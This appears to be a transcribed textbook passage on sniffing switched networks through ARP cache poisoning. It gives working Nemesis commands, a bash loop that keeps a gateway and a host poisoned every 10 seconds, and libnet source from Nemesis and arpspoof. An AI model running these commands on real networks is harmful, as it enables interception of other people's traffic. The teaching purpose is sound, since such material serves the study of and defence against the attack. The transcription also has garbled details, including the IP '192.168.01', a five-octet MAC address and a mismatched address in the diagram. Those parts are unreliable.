In a switched network environment, packets are only sent to the port they are destined for, according to their MAC addresses
This requires more intelligent hardware that can create and maintain a table associating MAC addresses with certain ports, depending on which device is connected to which port, as illustrated here

The advantage of a switched environment is that devices are only sent packets that are meant for them, so that promiscuous devices aren't able to sniff any additional packets
But even in a switched environment, there are clever ways to sniff other device's packets: they just tend to be a bit more complex
In order to find hacks like these, the details of the protocols must be examined and then combined

One important aspect of network communications that can be manipulated for interesting effects is the source address
There's no provision in these protocols to ensure that the source address in a packet really is the address of the source machine
The act of forging a source address in a packet is known as spoofing
The addition of spoofing to your bag of tricks greatly increases the number of possible hacks, since most systems expect the source address to be valid


                        ___________________________
                       | Port 1 00:00:00:AA:AA:AA |
                       | Port 2 00:00:00:BB:BB:BB |
                      /| Port 3 00:00:00:CC:CC:CC |
_____________________/
|       Switch      /|
|1  2  3           / |
|_  _  _             |
|_||_||_|____________|

Spoofing is the first step in sniffing packets on a switched network
The other 2 interesting details are found in ARP
First, when an ARP reply comes in with an IP address that already exists in the ARP cache, the receiving system will overwrite the prior MAC address information with the new information found in the reply (unless that entry in the ARP cache has explicitly marked as permanent)
Second, no state information about the ARP traffic is kept, since this would require additional memory and would complicate a protocol that is meant to be simple
This means systems will accept an ARP reply even if they didn't send out an ARP request

These 3 details, when exploited properly, allow an attacker to sniff network traffic on a switched network using a technique known as ARP redirection
The attacker sends spoofed ARP replies to certain devices that cause the ARP cache entries to be overwritten with the attacker's data
This technique is called ARP cache poisoning
In order to sniff network between 2 points A and B, the attacker needs to poison the ARP cache of A to cause A to believe that B's IP address is at the attacker's MAC address, and also poison the ARP cache of B to cause B to believe that A's IP address is also at the attacker's MAC address
Then the attacker's machine simply needs to forward these packets to their appropriate final destinations
After that, all of the traffic between A and B gets delivered, but it all flows through the attacker's machine, as shown here

 _____________________________________             ______________________________________
|               System A              |            |               System B              |
|        IP: 192.168.0.100            |            |        IP: 192.168.0.200            |
|        MAC: 00:00:00:AA:AA:AA       |            |        MAC: 00:00:00:BB:BB:BB       |
| ___________________________________ |            | ___________________________________ |
| |Internal ARP cache                ||            | |Internal ARP cache                ||
| |192.168.0.200 at 00:00:00:FA:CA:DE||            | |192.168.0.100 at 00:00:00:FA:CA:DE||
| |__________________________________||            | |__________________________________||
|_____________________________________|            |_____________________________________|
         |\\        \                                      //      /|
           \\        \                                    //      /
            \\        \                                  //      /
             \\        \                                //      /
              \\        \                              //      /
               \\    ____\|__________________________|//__    /
                \\  |          Attacker system            |  /
                 \\ |        IP: 192.168.0.137            | /
                  \\|        MAC: 00:00:00:FA:CA:DE       |/
                    | ___________________________________ |
                    | |Internal ARP cache                ||
                    | |192.168.0.100 at 00:00:00:AA:AA:AA||
                    | |192.168.0.22 at 00:00:00:BB:BB:BB ||
                    | |__________________________________||
                    |_____________________________________|

                ===== Traffic to A
                ----- Traffic to B

Since A and B are wrapping their own Ethernet headers on their packets based on their respective ARP caches, A's IP traffic meant for B is actually sent to the attacker's MAC address, and vice versa
The switch only filters traffic based on MAC address, so the switch will work as it's designed to, sending A's and B's traffic, destined for the attacker's MAC address, to the attacker's port
Then the attacker rewraps the IP packets with the proper Ethernet headers and sends them back to the switch, where they are finally routed to their proper destination
The switch works properly; it's the victim machines that are tricked into redirecting their traffic through the attacker's machine

Due to timeout values, the victim machines will periodically send out real ARP requests and receive real ARP replies in response
In order to maintain the redirection attack, the attacker must keep the victim machine's ARP caches poisoned
A simple way to accomplish this is to send spoofed ARP replies to both A and B at a constant interval- for example, every 10 seconds

A gateway is a system that routes all the traffic from a local network out to the Internet
ARP redirection is particulalry interseting when one of the victim machines is the default gateway, since the traffic between the default gateway and another system is that system's Internet traffic
For example, if a machine and 192.168.0.118 is communicating with the gateway at 192.168.0.1 over a switch, the traffic will be restricted by MAC address
This means that this traffic cannot normally be sniffed, even in promiscuous mode
In order to sniff this traffic, it must be redirected

To redirect the traffic, first the MAC addresses of 192.168.0.118 and 192.168.0.1 need to be determined
This can be done by pinging these hosts, since any IP connection attempt will use ARP
If we run a sniffer, we can see the ARP communications, but the OS will cache the resulting IP/MAC address associations
__________________________________________________________________________________
reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1
PING 192.168.0.1 (192.168.0.1): 56 octets data
64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms
--- 192.168.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.4/0.4/0.4 ms

reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118
PING 192.168.0.118 (192.168.0.118): 56 octets data
64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms
--- 192.168.0.118 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.4/0.4/0.4 ms

reader@hacking:~/booksrc $ arp -na
? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0
? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0

reader@hacking:~/booksrc $ ifconfig eth0
eth0      Link encap:Ethernet HWaddr 00:00:AD:D1:C7:ED
          inet addr:192.168.0.193 Bcast:192.168.0.255 Mask:255.255.255.0
          UP BROADCAST NOTRAILERS RUNNING MTU:1500 Metric:1
          RX packets:4153 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3875 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:100
          RX bytes:601686 (587.5 Kb) TX bytes:288567 (281.8 Kb)
          Interrupt:9 Base address:0xc000
__________________________________________________________________________________

After pinging, the MAC addresses for both 192.168.0.118 and 192.168.0.1 are in the attacker's ARP cache
This way, packets can reach their final destination after being redirected to the attacker's machine
Assuming IP forwarding compatibilities are compiled into the kernel, all we need to do is send some spoofed ARP replies at regular intervals
192.168.01 needs to be told that 192.168.0.1 is at 00:AD:D1:C7:ED, and 192.168.0.1 needs to be told that 192.168.0.118 is also at 00:AD:D1:C7:ED
These spoofed ARP packets can be injected using a command-line packet injection tool called Nemesis
Nemesis was originally a suite of tolls written by Mark Grimes, but in the most recent version 1.4, all functionality has been rolled up into a single utility by the new maintainer and developer Jeff Nathan
The source code for Nemesis is on the LiveCD at /usr/src/nemesis-1.4/, and it has already been built and installed
__________________________________________________________________________________
reader@hacking:~/booksrc $ nemesis

NEMESIS -=- The NEMESIS Project Version 1.4 (Build 26)

NEMESIS Usage:
  nemesis [mode] [options]

NEMESIS modes:
  arp
  dns
  ethernet
  icmp
  igmp
  ip
  ospf (currently non-functional)
  rip
  tcp
  udp

NEMESIS options:
  To display options, specify a mode with the option "help".

reader@hacking:~/booksrc $ nemesis arp help

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)

ARP/RARP Usage:
  arp [-v (verbose)] [options]

ARP/RARP Options:
  -S <Source IP address>
  -D <Destination IP address>
  -h <Sender MAC address within ARP frame>
  -m <Target MAC address within ARP frame>
  -s <Solaris style ARP requests with target hardware addess set to broadcast>
  -r ({ARP,RARP} REPLY enable)
  -R (RARP enable)
  -P <Payload file>

Data Link Options:
  -d <Ethernet device name>
  -H <Source MAC address>
  -M <Destination MAC address>

You must define a Source and Destination IP address.

reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M 00:C0:F0:79:3D:30

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)
              [MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
    [Ethernet type] ARP (0x0806)
 [Protocol addr:IP] 192.168.0.1 > 192.168.0.118
[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
       [ARP opcode] Reply
 [ARP hardware fmt] Ethernet (1)
 [ARP proto format] IP (0x0800)
 [ARP protocol len] 6
 [ARP hardware len] 4

Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB

ARP Packet Injected

reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M 00:50:18:00:0F:01

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)
              [MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
    [Ethernet type] ARP (0x0806)
 [Protocol addr:IP] 192.168.0.118 > 192.168.0.1
[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
       [ARP opcode] Reply
 [ARP hardware fmt] Ethernet (1)
 [ARP proto format] IP (0x0800)
 [ARP protocol len] 6
 [ARP hardware len] 4

Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.

ARP Packet Injected
__________________________________________________________________________________

These 2 commands spoof ARP replies from 192.168.0.1 to 192.168.0.118 and vice versa, both claiming that their MAC address is at the attacker's MAC address of 00:00:AD:D1:C7:ED
      We send packets to both addresses with the source MAC address as our device's
If these commands are repeated every 10 seconds, these bogus ARP replies will continue to keep the ARP cache poisoned and the traffic redirected
The standard BASH shell allows commands to be scripted, using familiar control flow statements
A simple BASH shell while-loop is used below to loop forever, sending our 2 poisoning ARP replies every 10 seconds
__________________________________________________________________________________
reader@hacking:~/booksrc $ while true
> do
> sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h
00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M
00:C0:F0:79:3D:30
> sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h
00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M
00:50:18:00:0F:01
> echo "Redirecting..."
> sleep 10
> done

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)
              [MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
    [Ethernet type] ARP (0x0806)
 [Protocol addr:IP] 192.168.0.1 > 192.168.0.118
[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
       [ARP opcode] Reply
 [ARP hardware fmt] Ethernet (1)
 [ARP proto format] IP (0x0800)
 [ARP protocol len] 6
 [ARP hardware len] 4
Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB

ARP Packet Injected

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)
              [MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
    [Ethernet type] ARP (0x0806)
 [Protocol addr:IP] 192.168.0.118 > 192.168.0.1
[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
       [ARP opcode] Reply
 [ARP hardware fmt] Ethernet (1)
 [ARP proto format] IP (0x0800)
 [ARP protocol len] 6
 [ARP hardware len] 4
Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.
ARP Packet Injected
Redirecting...
__________________________________________________________________________________

We can see how something as simple as Nemesis and the standard BASH shell can be used to quickly hack together a network exploit
Nemesis uses a C library called libnet to craft spoofed packets and inject them
Similar to libpcap, this library uses raw sockets and evens out the inconsistencies between platforms with a standardized interface
libnet also provides several convenient functions for dealing with network packets, such as checksum generation

The libnet library provides a simple and uniform API to craft and inject network packets
It's well documented and the functions have descriptive names
A high-level glance at the source code for Nemesis shows how easy it is to craft ARP packets using libnet
The source file nemesis-arp.c contains several functions for crafting and injecting ARP packets, using statically defined data structures for the packet header information
The nemesis_arp() funtions shown below is called in nemesis.c to build and inject an ARP packet

FROM nemesis-arp.c
__________________________________________________________________________________
static ETHERhdr etherhdr;
static ARPhdr arphdr;
...
void nemesis_arp(int argc, char **argv)
{
    const char *module= "ARP/RARP Packet Injection";
    
    nemesis_maketitle(title, module, version);
    
    if (argc > 1 && !strncmp(argv[1], "help", 4))
      arp_usage(argv[0]);
    
    arp_initdata();
    arp_cmdline(argc, argv);
    arp_validatedata();
    arp_verbose();
    
    if (got_payload)
    {
        if (builddatafromfile(ARPBUFFSIZE, &pd, (const char *)file, (const u_int32_t)PAYLOADMODE) < 0)
            arp_exit(1);
    }

    if (buildarp(&etherhdr, &arphdr, &pd, device, reply) < 0)
    {
        printf("\n%s Injection Failure\n", (rarp == 0 ? "ARP" : "RARP"));
        arp_exit(1);
    }
    else
    {
        printf("\n%s Packet Injected\n", (rarp == 0 ? "ARP" : "RARP"));
        arp_exit(0);
    }
}
__________________________________________________________________________________

The structures ETHERhdr and ARPhdr are defined in the file nemesis.h (shown below) as aliases for existing libnet data structures
In C, typedef is used to alias a data type with a symbol

FROM nemesis.h
__________________________________________________________________________________
typedef struct libnet_arp_hdr ARPhdr;
typedef struct libnet_as_lsa_hdr ASLSAhdr;
typedef struct libnet_auth_hdr AUTHhdr;
typedef struct libnet_dbd_hdr DBDhdr;
typedef struct libnet_dns_hdr DNShdr;
typedef struct libnet_ethernet_hdr ETHERhdr;
typedef struct libnet_icmp_hdr ICMPhdr;
typedef struct libnet_igmp_hdr IGMPhdr;
typedef struct libnet_ip_hdr IPhdr;
__________________________________________________________________________________

The nemesis_arp() function calls a series of other functions from this file: arp_initdata(), arp_cmdline(), arp_validatedata(), and arp_verbose()
We can probably guess that these functions initialize data, process command-line arguments, validate data, and do some sort of verbose reporting
The arp_initdata() function does exactly this, initializing values in statically declared data structures

The arp_initdata() function, shown below, sets various elements of the header structures to the appropriate values for an ARP packet

FROM nemesis-arp.c
__________________________________________________________________________________
static void arp_initdata(void)
{
    /* defaults */
    etherhdr.ether_type = ETHERTYPE_ARP; /* Ethernet type ARP */
    memset(etherhdr.ether_shost, 0, 6); /* Ethernet source address */
    memset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */
    arphdr.ar_op = ARPOP_REQUEST; /* ARP opcode: request */
    arphdr.ar_hrd = ARPHRD_ETHER; /* hardware format: Ethernet */
    arphdr.ar_pro = ETHERTYPE_IP; /* protocol format: IP */
    arphdr.ar_hln = 6; /* 6 byte hardware addresses */
    arphdr.ar_pln = 4; /* 4 byte protocol addresses */
    memset(arphdr.ar_sha, 0, 6); /* ARP frame sender address */
    memset(arphdr.ar_spa, 0, 4); /* ARP sender protocol (IP) addr */
    memset(arphdr.ar_tha, 0, 6); /* ARP frame target address */
    memset(arphdr.ar_tpa, 0, 4); /* ARP target protocol (IP) addr */
    pd.file_mem = NULL;
    pd.file_s = 0;
    return;
}
__________________________________________________________________________________

Finally, the nemesis_arp() function calls the function buildarp() with pointers to the header data structures
Judging from the way the return value from buildarp() is handled here, buildarp() builds the packet and injects it
This function is found in yet another source file, nemesis-proto_arp.c

FROM nemesis-proto_arp.c
__________________________________________________________________________________
int buildarp(ETHERhdr *eth, ARPhdr *arp, FileData *pd, char *device, int reply)
{
    int n = 0;
    u_int32_t arp_packetlen;
    static u_int8_t *pkt;
    struct libnet_link_int *l2 = NULL;
    
    /* validation tests */

    if (pd->file_mem == NULL)
        pd->file_s = 0;
    
    arp_packetlen = LIBNET_ARP_H + LIBNET_ETH_H + pd->file_s;

#ifdef DEBUG
    printf("DEBUG: ARP packet length %u.\n", arp_packetlen);
    printf("DEBUG: ARP payload size %u.\n", pd->file_s);
#endif
    
    if ((l2 = libnet_open_link_interface(device, errbuf)) == NULL)
    {
        nemesis_device_failure(INJECTION_LINK, (const char *)device);
        return -1;
    }

    if (libnet_init_packet(arp_packetlen, &pkt) == -1)
    {
        fprintf(stderr, "ERROR: Unable to allocate packet memory.\n");
        return -1;
    }

    libnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type,
            NULL, 0, pkt);

    libnet_build_arp(arp->ar_hrd, arp->ar_pro, arp->ar_hln,arp->ar_pln,
            arp->ar_op, arp->ar_sha, arp->ar_spa, arp->ar_tha, arp->ar_tpa,
            pd->file_mem, pd->file_s, pkt + LIBNET_ETH_H);
    
    n = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H +
                LIBNET_ARP_H + pd->file_s);
    
    if (verbose == 2)
        nemesis_hexdump(pkt, arp_packetlen, HEX_ASCII_DECODE);
    if (verbose == 3)
        nemesis_hexdump(pkt, arp_packetlen, HEX_RAW_DECODE);
    
    if (n != arp_packetlen)
    {
        fprintf(stderr, "ERROR: Incomplete packet injection. Only "
            "wrote %d bytes.\n", n);
    }
    else
    {
        if (verbose)
        {
            if (memcmp(eth->ether_dhost, (void *)&one, 6))
            {
                printf("Wrote %d byte unicast ARP request packet through "
                "linktype %s.\n", n,
                nemesis_lookup_linktype(l2->linktype));
            }
            else
            {
                printf("Wrote %d byte %s packet through linktype %s.\n", n, (eth->ether_type == ETHERTYPE_ARP ? "ARP" : "RARP"), nemesis_lookup_linktype(l2->linktype));
            }
         }
    }

    libnet_destroy_packet(&pkt);
    if (l2 != NULL)
        libnet_close_link_interface(l2);
    return (n);
}
__________________________________________________________________________________

At a high level, this function should be readable to us
Using libnet functions, it opens a link interface and initializes memory for a packet
Then, it builds the Ethernet layer using elements from the Ethernet header data structure and then does the same for the ARP layer
Next, it writes the packet to the device to inject it, and finally cleans up by destroying the packet and closing the interface
The documentation for these functions form the libnet man page is shown below for clarity
__________________________________________________________________________________
libnet_open_link_interface()
opens a low-level packet interface.
This is required to write link layer frames.
Supplied is a u_char pointer to the interface device name and a u_char pointer to an error buffer.
Returned is a filled in libnet_link_int struct or NULL on error.

libnet_init_packet()
initializes a packet for use.
If the size parameter is omitted (or negative) the library will pick a reasonable value for the user (currently LIBNET_MAX_PACKET).
If the memory allocation is successful, the memory is zeroed and the function returns 1. 
If there is an error, the function returns -1.
Since this function calls malloc, you certainly should, at some point, make a corresponding call to destroy_packet().

libnet_build_ethernet()
constructs an ethernet packet.
Supplied is the destination address, source address (as arrays of unsigned characterbytes) and the ethernet frame type, a pointer to an optional data payload, the payload length, and a pointer to a pre-allocated block of memory for the packet.
The ethernet packet type should be one of the following:
Value                Type
ETHERTYPE_PUP        PUP protocol
ETHERTYPE_IP         IP protocol
ETHERTYPE_ARP        ARP protocol
ETHERTYPE_REVARP     Reverse ARP protocol
ETHERTYPE_VLAN       IEEE VLAN tagging
ETHERTYPE_LOOPBACK   Used to test interfaces

libnet_build_arp()
constructs an ARP (Address Resolution Protocol) packet.
Supplied are the following: hardware address type, protocol address type, the hardware address length, the protocol address length, the ARP packet type, the sender hardware address, the sender protocol address, the target hardware address, the target protocol address, the packet payload, the payload size, and finally, a pointer to the packet header memory.
Note that this function only builds ethernet/IP ARP packets, and consequently the first value should be ARPHRD_ETHER.
The ARP packet type should be one of the following:
ARPOP_REQUEST, ARPOP_REPLY, ARPOP_REVREQUEST, ARPOP_REVREPLY, ARPOP_INVREQUEST, or ARPOP_INVREPLY.

libnet_destroy_packet()
frees the memory associated with the packet.

libnet_close_link_interface()
closes an opened low-level packet interface. Returned is 1 upon success or -1 on error.
__________________________________________________________________________________

With a basic understanding of C, API documentation, and common sense, we can teach ourself just by examining open source projects
For example, Dug Song provides a program called arpsoof, included with dsniff, that performs the ARP redirection attack

FROM the arpspoof Man page
__________________________________________________________________________________
NAME
       arpspoof - intercept packets on a switched LAN

SYNOPSIS
       arpspoof [-i interface] [-t target] host

DESCRIPTION
       arpspoof redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch.

       Kernel IP forwarding (or a userland program which accomplishes the same, e.g. fragrouter(8)) must be turned on ahead of time.

OPTIONS
       -i interface
              Specify the interface to use.

       -t target
              Specify a particular host to ARP poison (if not specified, all hosts on the LAN).
        host
              Specify the host you wish to intercept packets for (usually the local gateway).

SEEALSO
      dsniff(8),fragrouter(8)

AUTHOR
      Dug Song <dugsong@monkey.org>
__________________________________________________________________________________

The magic of this program comes from its arp_send() function, which also uses libnet to spoof packets
The source code for this function should be readable to us, since many of the previous explained libnet functions are used
The use of structures and an error buffer should also be familiar

arpspoof.c
__________________________________________________________________________________
static struct libnet_link_int *llif;
static struct ether_addr spoof_mac, target_mac;
static in_addr_t spoof_ip, target_ip;
...

int
arp_send(struct libnet_link_int *llif, char *dev,
     int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)
{
    char ebuf[128];
    u_char pkt[60];

    if (sha == NULL &&
        (sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {
        return (-1);
    }
    if (spa == 0) {
        if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)
            return (-1);
        spa = htonl(spa); /* XXX */
    }
    if (tha == NULL)
        tha = "\xff\xff\xff\xff\xff\xff";

    libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);

    libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,
             op, sha, (u_char *)&spa, tha, (u_char *)&tpa,
             NULL, 0, pkt + ETH_H);

    fprintf(stderr, "%s ",
        ether_ntoa((struct ether_addr *)sha));

    if (op == ARPOP_REQUEST) {
        fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
            ether_ntoa((struct ether_addr *)tha),
            libnet_host_lookup(tpa, 0),
            libnet_host_lookup(spa, 0));
    }
    else {
         fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
             ether_ntoa((struct ether_addr *)tha),
             libnet_host_lookup(spa, 0));
         fprintf(stderr, "%s\n",
             ether_ntoa((struct ether_addr *)sha));
    }
    return (libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));
}
__________________________________________________________________________________

The remaining libnet functions get hardware address, get the IP address, and look up hosts
These functions have descriptive names and are explained in detail on the libnet man page

FROM the libnet man page
__________________________________________________________________________________
libnet_get_hwaddr()
takes a pointer to a link layer interface struct, a pointer to the network device name, and an empty buffer to be used in case of error.
The function returns the MAC address of the specified interface upon success or 0 upon error (and errbuf will contain a reason).

libnet_get_ipaddr()
takes a pointer to a link layer interface struct, a pointer to the network device name, and an empty buffer to be used in case of error.
Upon success the function returns the IP address of the specified interface in host-byte order or 0 upon error (and errbuf will contain a
reason).

libnet_host_lookup()
converts the supplied network-ordered (big-endian) IPv4 address into its human-readable counterpart.
If use_name is 1, libnet_host_lookup() will attempt to resolve this IP address and return a hostname, otherwise (or if the lookup fails), the function returns a dotted-decimal ASCII string.
__________________________________________________________________________________

Once we've learned how to read C code, existing programs can teach us a lot by example
Programming libraries like libnet and libpcap have plenty of documentation that explains all the details we may not be able to divine from the source alone
The goal here is to teach us how to learn from source code, as opposed to just teaching how to use a few libraries
After all, there are many other libraries and a lot of existing source code that uses them